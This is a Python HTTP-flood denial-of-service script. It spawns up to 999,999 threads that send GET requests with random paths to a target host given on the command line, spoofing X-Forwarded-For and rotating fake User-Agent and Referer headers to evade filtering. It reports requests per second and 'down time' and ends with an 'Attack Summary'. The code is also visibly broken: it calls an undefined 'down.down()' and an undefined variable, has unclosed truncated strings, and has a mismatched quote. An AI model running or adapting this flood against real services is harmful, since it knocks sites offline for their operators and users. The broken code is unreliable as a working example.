import threading,requests,random,string,time,sys,os

# =================== CONFIG DEFAULTS ===================
TARGET_URL = "https://127.0.0.1"
THREADS = 999999
REQUESTS_PER_THREAD = 999999
DELAY = 0.001

# =================== ARGUMENT INPUT ===================
if len(sys.argv) >= 2:
    TARGET_URL = f"https://{sys.argv[1]}"
if len(sys.argv) >= 3:
    THREADS = int(sys.argv[2])
if len(sys.argv) >= 4:
    REQUESTS_PER_THREAD = int(sys.argv[3])

# =================== HEADERS LIST ===================
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, l>
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Fir>
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHT>
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML>
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)>
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firef>
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, lik>
    "Mozilla/5.0 (X11; Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, lik>
    "Mozilla/5.0 (X11; Kali; Linux x86_64) AppleWebKit/537.36 (KHTML, like >
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605>
    "Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KH>
    "Mozilla/5.0 (Linux; Android 12; SM-G991B)",
    "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, l>
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, li>
    "Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-T865) AppleWebKit/537.36 (KH>
    "Mozilla/5.0 (PlayStation 5 3.00) AppleWebKit/537.36 (KHTML, like Gecko>
    "Mozilla/5.0 (Nintendo Switch; rv:13.0) Gecko/13.0 Firefox/13.0",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.htm>
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm>
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.18",
    "Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en) AppleWebKit/534.11+ (>
    "Mozilla/5.0 (Linux; Android 13; SM-A536E) AppleWebKit/537.36 (KHTML, l>
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "curl/7.68.0"
]

# =================== GLOBAL STATS ===================
success_count = 0
fail_count = 0
lock = threading.Lock()
start_time = time.time()
percentage_to_down = down.down()

# =================== RANDOM PATH ===================
def generate_random_path():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(5, 15)))

# =================== ATTACK FUNCTION ===================
def attack(thread_id):
    global success_count, fail_count
    for i in range(REQUESTS_PER_THREAD):
        headers = {
            "User-Agent": random.choice(user_agents),
            "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4)),
            "Referer": f"https://google.com/{generate_random_path()}",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "no-cache",
            "Connection": "keep-alive"
        }
        try:
            requests.get(f"{TARGET_URL}/{generate_random_path()}", headers=headers, timeout=3)
            with lock:
                success_count += 1
        except requests.RequestException:
            with lock:
                fail_count += 1
        time.sleep(DELAY)

# =================== MONITOR FUNCTION ===================
def monitor():
    while True:
        time.sleep(1)
        with lock:
            total = success_count + fail_count
            elapsed = time.time() - start_time
            rps = total / elapsed if elapsed > 0 else 0
            success_rate = (success_count / total * 100) if total > 0 else 0
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"🌐 Target: {TARGET_URL}")
            print(f"🧵 Threads: {THREADS}")
            print(f"📦 Requests/Thread: {REQUESTS_PER_THREAD}")
            print(f"⏱ Elapsed: {elapsed:.2f}s")
            print(f"✅ Success: {success_count}")
            print(f"❌ Failed: {fail_count}")
            print(f"📊 Success Rate: {success_rate:.2f}%")
            print(f"⚡ RPS (Requests/sec): {rps:.2f}")
            print(f"📉 Succes Rate Of Was Down Time: {success_rate:.2f}%")
            
# =================== START ATTACK ===================
def start_attack():
    threads = []

    monitor_thread = threading.Thread(target=monitor, daemon=True)
    monitor_thread.start()

    for i in range(THREADS):
        t = threading.Thread(target=attack, args=(i,))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

if __name__ == "__main__":
    start_attack()
    total_time = time.time() - start_time
    print("\n--- Attack Summary ---")
    print(f"Total Requests Sent: {success_count + fail_count}")
    print(f"Successful Requests: {success_count}")
    print(f"Failed Requests: {fail_count}")
    print(f"Total Time: {total_time:.2f} sec")
    print(f'total Down Rate: {Down_Percentage:2f}%")
    
